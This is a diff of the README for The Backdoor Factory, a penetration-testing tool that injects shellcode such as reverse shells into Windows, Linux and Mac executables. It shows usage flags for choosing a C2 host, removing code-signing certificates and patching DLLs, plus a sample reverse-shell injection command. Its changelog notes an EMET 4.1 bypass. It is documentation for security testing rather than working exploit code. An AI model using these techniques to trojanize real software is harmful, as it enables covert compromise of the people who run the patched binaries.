@@ -2,9 +2,52 @@
 ##The Backdoor Factory (BDF)
 For security professionals and researchers only.
 
-The goal of BDF is patch executable binaries with user desidered shellcode and continue normal execution of the prepatched state.
+The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
 
-Supporting: Windows PE x32/x64 and Linux ELF x32/x64 (System V)
+DerbyCon 2014 Presentation: http://www.youtube.com/watch?v=LjUN9MACaTs
+
+Contact the developer on:
+  
+    IRC:
+    irc.freenode.net #BDFactory 
+
+    Twitter:
+    @midnite_runr
+
+
+Under a BSD 3 Clause License
+
+See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki
+
+Dependences: 
+
+Capstone, using the 'next' repo until it is the 'master' repo: 
+https://github.com/aquynh/capstone/tree/next
+
+Pefile, most recent:
+https://code.google.com/p/pefile/
+
+INSTALL:
+
+./install.sh
+
+This will install Capstone with the 'next' repo and use pip to install pefile.
+
+UPDATE:
+
+./update.sh
+
+---
+
+Supporting: 
+
+    Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), 
+    and Mach-O x86/x64 and those formats in FAT files
+    
+    Packed Files: PE UPX x86/x64
+    
+    Experimental: OpenBSD x32 
+
 
 Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.
 
@@ -34,9 +77,10 @@ Recently tested on many binaries.
       -h, --help            show this help message and exit
       -f FILE, --file=FILE  File to backdoor
       -s SHELL, --shell=SHELL
-                            Payloads that are available for use.
+                            Payloads that are available for use. Use 'show' to see
+                            payloads.
       -H HOST, --hostip=HOST
-                            IP of the C2 for reverse connections
+                            IP of the C2 for reverse connections.
       -P PORT, --port=PORT  The port to either connect back to for reverse shells
                             or to listen on for bind shells
       -J, --cave_jumping    Select this options if you want to use code cave
@@ -90,7 +134,7 @@ Recently tested on many binaries.
       -q, --no_banner       Kills the banner.
       -v, --verbose         For debug information output.
       -T IMAGE_TYPE, --image-type=IMAGE_TYPE
-                            ALL, x32, or x64 type binaries only. Default=ALL
+                            ALL, x86, or x64 type binaries only. Default=ALL
       -Z, --zero_cert       Allows for the overwriting of the pointer to the PE
                             certificate table effectively removing the certificate
                             from the binary for all intents and purposes.
@@ -98,8 +142,12 @@ Recently tested on many binaries.
                             level="highestAvailable"'. If this string is included
                             in the binary, it must run as system/admin. Doing this
                             slows patching speed significantly.
-      -L, --patch_dll       Use this setting if you DON'T want to patch DLLs. 
+      -L, --patch_dll       Use this setting if you DON'T want to patch DLLs.
                             Patches by default.
+      -F FAT_PRIORITY, --FAT_PRIORITY=FAT_PRIORITY
+                            For MACH-O format. If fat file, focus on which arch to
+                            patch. Default is x64. To force x86 use -F x86, to
+                            force both archs use -F ALL.
 ---
 
 ##Features:
@@ -120,6 +168,9 @@ Recently tested on many binaries.
 ###ELF Files
 
     Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.
+
+###Mach-O Files
+    Pre-Text Section patching and signature removal
 
 ###Overall
     
@@ -212,3 +263,53 @@ Sample Usage:
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
 
     ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 
+
+---
+
+###Changelog
+
+10/11/2014
+PE UPX Patching Added
+
+
+9/26/2014
+
+Mach-O x86/x64 added
+
+x86 IAT payload optimization
+
+
+7/31/2014 
+
+Added support for ARM x32 LE ELF patching
+
+7/22/2014 Changelog
+
+Added FreeBSD x32 ELF patching support
+
+Change to BSD 3 Clause License
+
+
+7/13/2014 Changelog
+
+Incorporated Capstone: http://www.capstone-engine.org/
+
+During the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.
+
+Renamed loadliba_reverse_tcp to iat_reverse_tcp.
+
+Small optimizations for speed.
+
+
+5/30/2014 Changelog
+
+Added a new win86 shellcode: loadliba_reverse_tcp
+    
+  - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.
+  - This shellcode uses LoadLibraryA and GetProcessAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
+  - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
+  - Bypasses EMET 4.1. The caller protection doesn't catch it.
+  - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
+
+---
+
